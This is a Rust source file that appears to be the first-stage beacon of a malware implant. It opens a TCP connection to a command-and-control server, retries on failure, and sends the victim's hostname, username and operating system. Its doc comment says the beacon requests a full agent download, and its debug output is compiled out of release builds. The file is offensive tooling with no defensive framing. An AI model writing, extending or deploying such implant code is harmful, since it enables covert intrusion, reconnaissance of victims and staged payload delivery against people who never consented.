//! Initial beacon functionality for Stage0
//!
//! Sends a minimal beacon to the C2 server to announce presence

use crate::config::{get_c2_server, SessionConfig};
use std::error::Error;
use std::io::Write;
use std::net::TcpStream;
use std::time::Duration;

/// Sends initial beacon to C2 server
///
/// The beacon contains minimal information:
/// - Magic header to identify as Stage0
/// - System info (hostname, username, OS)
/// - Request for full agent download
///
/// # Returns
///
/// * `Ok(())` - Beacon sent successfully
/// * `Err(_)` - Failed to send beacon
pub fn send_initial_beacon() -> Result<(), Box<dyn Error>> {
    let config = SessionConfig::default();
    let server = get_c2_server();

    #[cfg(feature = "dev")]
    println!("[BEACON] Connecting to C2 at {}", server);

    // Attempt connection with retries
    let mut last_error = None;
    
    for attempt in 0..config.max_retries {
        match try_send_beacon(server, config.timeout) {
            Ok(_) => {
                #[cfg(feature = "dev")]
                println!("[BEACON] Initial beacon sent successfully");
                return Ok(());
            }
            Err(e) => {
                #[cfg(feature = "dev")]
                eprintln!("[BEACON] Attempt {} failed: {}", attempt + 1, e);
                
                last_error = Some(e);
                
                if attempt < config.max_retries - 1 {
                    std::thread::sleep(Duration::from_secs(config.retry_delay));
                }
            }
        }
    }

    Err(last_error.unwrap_or_else(|| "Failed to send beacon".into()))
}

/// Attempts to send beacon once
fn try_send_beacon(server: &str, timeout: u64) -> Result<(), Box<dyn Error>> {
    // Connect to C2 server
    let mut stream = TcpStream::connect_timeout(
        &server.parse()?,
        Duration::from_secs(timeout),
    )?;

    // Set read/write timeouts
    stream.set_read_timeout(Some(Duration::from_secs(timeout)))?;
    stream.set_write_timeout(Some(Duration::from_secs(timeout)))?;

    // Build beacon message
    let beacon_msg = build_beacon_message()?;

    // Send beacon
    stream.write_all(beacon_msg.as_bytes())?;
    stream.flush()?;

    Ok(())
}

/// Builds the beacon message
fn build_beacon_message() -> Result<String, Box<dyn Error>> {
    // Get system information
    let hostname = get_hostname();
    let username = get_username();
    let os_info = get_os_info();

    // Format beacon message
    // Protocol: STAGE0_BEACON|hostname|username|os
    let beacon = format!("STAGE0_BEACON|{}|{}|{}\n", hostname, username, os_info);

    Ok(beacon)
}

/// Gets the system hostname
fn get_hostname() -> String {
    #[cfg(target_os = "windows")]
    {
        use std::env;
        env::var("COMPUTERNAME").unwrap_or_else(|_| "UNKNOWN".to_string())
    }

    #[cfg(not(target_os = "windows"))]
    {
        "UNKNOWN".to_string()
    }
}

/// Gets the current username
fn get_username() -> String {
    #[cfg(target_os = "windows")]
    {
        use std::env;
        env::var("USERNAME").unwrap_or_else(|_| "UNKNOWN".to_string())
    }

    #[cfg(not(target_os = "windows"))]
    {
        "UNKNOWN".to_string()
    }
}

/// Gets OS information
fn get_os_info() -> String {
    #[cfg(target_os = "windows")]
    {
        "Windows".to_string()
    }

    #[cfg(not(target_os = "windows"))]
    {
        std::env::consts::OS.to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_build_beacon_message() {
        let msg = build_beacon_message().unwrap();
        assert!(msg.starts_with("STAGE0_BEACON|"));
        assert!(msg.contains('|'));
    }

    #[test]
    fn test_get_system_info() {
        let hostname = get_hostname();
        let username = get_username();
        let os = get_os_info();

        assert!(!hostname.is_empty());
        assert!(!username.is_empty());
        assert!(!os.is_empty());
    }
}
